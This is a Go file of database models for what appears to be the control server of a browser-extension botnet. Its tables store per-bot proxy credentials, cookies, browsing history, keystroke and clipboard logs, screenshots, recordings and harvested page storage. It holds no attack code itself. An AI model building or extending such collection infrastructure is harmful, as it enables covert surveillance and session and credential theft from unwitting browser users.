package models

import (
	"time"

	"github.com/google/uuid"
	"gorm.io/gorm"
)

// All models use UUID primary keys with column name "id" and Sequelize-style
// "createdAt"/"updatedAt" timestamp columns so existing legacy database
// volumes keep working without migration.

type BaseUUID struct {
	ID        uuid.UUID `gorm:"type:uuid;primaryKey;column:id"`
	CreatedAt time.Time `gorm:"column:createdAt;autoCreateTime"`
	UpdatedAt time.Time `gorm:"column:updatedAt;autoUpdateTime"`
}

// BeforeCreate auto-assigns a UUID v4 if none was set.
func (b *BaseUUID) BeforeCreate(_ *gorm.DB) error {
	if b.ID == uuid.Nil {
		b.ID = uuid.New()
	}
	return nil
}

// User mirrors Sequelize Users table (database.js:Users).
type User struct {
	BaseUUID
	Username                string `gorm:"type:text;uniqueIndex;column:username"`
	Password                string `gorm:"type:text;column:password"`
	PasswordShouldBeChanged bool   `gorm:"not null;default:false;column:password_should_be_changed"`
}

func (User) TableName() string { return "users" }

// Bot mirrors Sequelize Bots table.
type Bot struct {
	BaseUUID
	BrowserID         string     `gorm:"type:text;not null;index;column:browser_id"`
	Name              string     `gorm:"type:text;not null;default:'Untitled Proxy';column:name"`
	ProxyUsername     string     `gorm:"type:text;uniqueIndex;column:proxy_username"`
	ProxyPassword     string     `gorm:"type:text;not null;index;column:proxy_password"`
	IsOnline          bool       `gorm:"not null;default:true;column:is_online"`
	LastOnline        time.Time  `gorm:"not null;column:last_online"`
	CurrentTab        JSONMap    `gorm:"type:jsonb;column:current_tab"`
	CurrentTabImage   string     `gorm:"type:text;default:'';column:current_tab_image"`
	CurrentTabImageAt *time.Time `gorm:"column:current_tab_image_at"`
	Tabs              JSONArray  `gorm:"type:jsonb;column:tabs"`
	History           JSONArray  `gorm:"type:jsonb;column:history"`
	Cookies           JSONArray  `gorm:"type:jsonb;column:cookies"`
	State             string     `gorm:"type:text;default:'';column:state"`
	Bookmarks         JSONArray  `gorm:"type:jsonb;column:bookmarks"`
	Downloads         JSONArray  `gorm:"type:jsonb;column:downloads"`
	Sessions          JSONArray  `gorm:"type:jsonb;column:sessions"`
	TopSites          JSONArray  `gorm:"type:jsonb;column:top_sites"`
	SystemInfo        JSONMap    `gorm:"type:jsonb;column:system_info"`
	ReadingList       JSONArray  `gorm:"type:jsonb;column:reading_list"`
	SwitchConfig      JSONMap    `gorm:"type:jsonb;column:switch_config"`
	DataConfig        JSONMap    `gorm:"type:jsonb;column:data_config"`
	UserAgent         string     `gorm:"type:text;column:user_agent"`
	Recording         JSONArray  `gorm:"type:jsonb;column:recording"`
	Screenshots       JSONArray  `gorm:"type:jsonb;column:screenshots"`
	Activity          JSONArray  `gorm:"type:jsonb;column:activity"`
	LastActiveAt      *time.Time `gorm:"column:last_active_at"`
}

func (Bot) TableName() string { return "bots" }

// BotRecording mirrors Sequelize BotRecording table.
type BotRecording struct {
	BaseUUID
	Recording string     `gorm:"type:text;not null;column:recording"`
	Bot       uuid.UUID  `gorm:"type:uuid;index;column:bot"`
	Text      string     `gorm:"type:text;column:text"`
	Timestamp *time.Time `gorm:"column:timestamp"`
	SessionID string     `gorm:"type:text;column:session_id"`
}

func (BotRecording) TableName() string { return "bot_recordings" }

// BotScreenshot mirrors Sequelize BotScreenshots table.
type BotScreenshot struct {
	BaseUUID
	BotID      uuid.UUID `gorm:"type:uuid;index;column:bot_id"`
	URL        string    `gorm:"type:text;column:url"`
	Title      string    `gorm:"type:text;column:title"`
	ImageData  string    `gorm:"type:text;not null;column:image_data"`
	SessionID  string    `gorm:"type:text;column:session_id"`
	Difference *float64  `gorm:"column:difference"`
	Timestamp  time.Time `gorm:"not null;index;column:timestamp"`
}

func (BotScreenshot) TableName() string { return "bot_screenshots" }

// BotKeyboardLog mirrors Sequelize BotKeyboardLogs table.
type BotKeyboardLog struct {
	BaseUUID
	BotID     uuid.UUID `gorm:"type:uuid;index;column:bot_id"`
	URL       string    `gorm:"type:text;column:url"`
	Title     string    `gorm:"type:text;column:title"`
	Keys      string    `gorm:"type:text;not null;column:keys"`
	Field     string    `gorm:"type:text;column:field"`
	Timestamp time.Time `gorm:"not null;index;column:timestamp"`
}

func (BotKeyboardLog) TableName() string { return "bot_keyboard_logs" }

// BotClipboardLog stores clipboard copy/cut events per bot.
type BotClipboardLog struct {
	BaseUUID
	BotID     uuid.UUID `gorm:"type:uuid;index;column:bot_id"`
	URL       string    `gorm:"type:text;column:url"`
	Title     string    `gorm:"type:text;column:title"`
	Text      string    `gorm:"type:text;not null;column:text"`
	Action    string    `gorm:"type:text;column:action"`
	Timestamp time.Time `gorm:"not null;index;column:timestamp"`
}

func (BotClipboardLog) TableName() string { return "bot_clipboard_logs" }

// BotNavEvent is a persisted webNavigation / SPA history update.
type BotNavEvent struct {
	BaseUUID
	BotID          uuid.UUID `gorm:"type:uuid;index;column:bot_id"`
	URL            string    `gorm:"type:text;column:url"`
	Title          string    `gorm:"type:text;column:title"`
	TransitionType string    `gorm:"type:text;column:transition_type"`
	TabID          int       `gorm:"column:tab_id"`
	Timestamp      time.Time `gorm:"not null;index;column:timestamp"`
}

func (BotNavEvent) TableName() string { return "bot_nav_events" }

// BotAlert is an operator-facing detection (currently domain visits).
type BotAlert struct {
	BaseUUID
	BotID        uuid.UUID `gorm:"type:uuid;index;column:bot_id"`
	Kind         string    `gorm:"type:text;index;column:kind"`
	Severity     string    `gorm:"type:text;column:severity"`
	Title        string    `gorm:"type:text;column:title"`
	URL          string    `gorm:"type:text;column:url"`
	Detail       string    `gorm:"type:text;column:detail"`
	Timestamp    time.Time `gorm:"not null;index;column:timestamp"`
	Acknowledged bool      `gorm:"not null;default:false;column:acknowledged"`
}

func (BotAlert) TableName() string { return "bot_alerts" }

// BotDeltaEvent is an append-only cookie or tab change from the Sensor.
type BotDeltaEvent struct {
	BaseUUID
	BotID     uuid.UUID `gorm:"type:uuid;index;column:bot_id"`
	Kind      string    `gorm:"type:text;index;column:kind"`
	Action    string    `gorm:"type:text;column:action"`
	URL       string    `gorm:"type:text;column:url"`
	Title     string    `gorm:"type:text;column:title"`
	Detail    string    `gorm:"type:text;column:detail"`
	Payload   JSONMap   `gorm:"type:jsonb;column:payload"`
	Timestamp time.Time `gorm:"not null;index;column:timestamp"`
}

func (BotDeltaEvent) TableName() string { return "bot_delta_events" }

// BotPageStorage is the latest harvested origin localStorage/sessionStorage.
type BotPageStorage struct {
	BaseUUID
	BotID      uuid.UUID `gorm:"type:uuid;uniqueIndex;column:bot_id"`
	Origins    JSONArray `gorm:"type:jsonb;column:origins"`
	CapturedAt time.Time `gorm:"not null;column:captured_at"`
}

func (BotPageStorage) TableName() string { return "bot_page_storage" }

// Setting mirrors Sequelize Settings table.
type Setting struct {
	BaseUUID
	Key   string `gorm:"type:text;uniqueIndex;column:key"`
	Value string `gorm:"type:text;column:value"`
}

func (Setting) TableName() string { return "settings" }

// All returns the slice of model pointers used for AutoMigrate.
func All() []any {
	return []any{
		&User{},
		&Bot{},
		&BotRecording{},
		&BotScreenshot{},
		&BotKeyboardLog{},
		&BotClipboardLog{},
		&BotNavEvent{},
		&BotAlert{},
		&BotDeltaEvent{},
		&BotPageStorage{},
		&BotBrowserSnapshot{},
		&BotBrowserSnapshotState{},
		&Setting{},
	}
}
